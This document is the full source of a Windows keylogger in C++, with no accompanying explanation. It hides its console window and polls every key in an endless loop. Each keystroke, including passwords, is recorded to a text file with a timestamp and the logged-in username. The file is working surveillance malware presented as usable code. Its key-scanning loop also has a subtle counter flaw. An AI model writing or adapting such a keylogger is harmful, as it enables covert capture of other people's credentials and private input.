#include <iostream>
#include <fstream>
#include <windows.h>
#include <ctime>
#include <cstdlib>
#include <lmcons.h>
#include <map>
using namespace std;
map<int, string> keyMap = {
    {VK_SHIFT, "[SHIFT]"},
    {VK_BACK, "[BACKSPACE]"},
    {VK_LBUTTON, "[LCLICK]"},
    {VK_RBUTTON, "[RCLICK]"},
    {VK_RETURN, "[ENTER]"},
    {VK_TAB, "[TAB]"},
    {VK_ESCAPE, "[ESCAPE]"},
    {VK_CONTROL, "[CTRL]"},
    {VK_MENU, "[ALT]"},
    {VK_CAPITAL, "[CAPS LOCK]"},
    {VK_SPACE, "[SPACE]"},
    {VK_LEFT, "[LEFT ARROW]"},
    {VK_RIGHT, "[RIGHT ARROW]"},
    {VK_UP, "[UP ARROW]"},
    {VK_DOWN, "[DOWN ARROW]"},
    {VK_INSERT, "[INSERT]"},
    {VK_DELETE, "[DELETE]"},
    {VK_HOME, "[HOME]"},
    {VK_END, "[END]"},
    {VK_PRIOR, "[PAGE UP]"},
    {VK_NEXT, "[PAGE DOWN]"},
    {VK_NUMLOCK, "[NUM LOCK]"},
    {VK_SCROLL, "[SCROLL LOCK]"},
    {VK_PAUSE, "[PAUSE]"},
    {VK_F1, "[F1]"},
    {VK_F2, "[F2]"},
    {VK_F3, "[F3]"},
    {VK_F4, "[F4]"},
    {VK_F5, "[F5]"},
    {VK_F6, "[F6]"},
    {VK_F7, "[F7]"},
    {VK_F8, "[F8]"},
    {VK_F9, "[F9]"},
    {VK_F10, "[F10]"},
    {VK_F11, "[F11]"},
    {VK_F12, "[F12]"},
    {VK_APPS, "[MENU]"},
    {VK_MULTIPLY, "[*]"},
    {VK_ADD, "[+]"},
    {VK_SEPARATOR, "[SEPARATOR]"},
    {VK_SUBTRACT, "[-]"},
    {VK_DECIMAL, "[.]"},
    {VK_DIVIDE, "[/]"},
    {VK_NUMPAD0, "[NUM 0]"},
    {VK_NUMPAD1, "[NUM 1]"},
    {VK_NUMPAD2, "[NUM 2]"},
    {VK_NUMPAD3, "[NUM 3]"},
    {VK_NUMPAD4, "[NUM 4]"},
    {VK_NUMPAD5, "[NUM 5]"},
    {VK_NUMPAD6, "[NUM 6]"},
    {VK_NUMPAD7, "[NUM 7]"},
    {VK_NUMPAD8, "[NUM 8]"},
    {VK_NUMPAD9, "[NUM 9]"}
};

string GetTimeString()
{
    time_t now = time(nullptr);
    struct tm *timeinfo = localtime(&now);
    char buffer[80];
    strftime(buffer, 80, "%Y-%m-%d %H:%M:%S", timeinfo);
    return string(buffer);
}

string GetUsername()
{
    wchar_t username[UNLEN + 1];
    DWORD username_len = UNLEN + 1;
    if (GetUserNameW(username, &username_len))
    {
        char charUsername[UNLEN + 1];
        wcstombs(charUsername, username, username_len);
        return string(charUsername);
    }
    return "UnknownUser";
}

void Save(int _key, string file)
{
    ofstream kout(file, ios::app);
    if (!kout)
    {
        cerr << "Error opening file: " << file << endl;
        return;
    }

    // Current time
    string timeStr = GetTimeString();
    kout << "[" << timeStr << "] ";

    // Username
    string username = GetUsername();
    kout << "User: " << username << " ";

    // Key
    if (keyMap.count(_key))
        kout << keyMap[_key];
    else
        kout << char(_key);
    kout << endl;
    kout.close();
    return;
}

int main()
{
    FreeConsole();
    string file = "key_logged.txt";
    while (true)
    {
        Sleep(10);
        for (char i = 8; i <= 255; i++)
            if (GetAsyncKeyState(i) == -32767)
                Save(i, file);
    }
    return 0;
}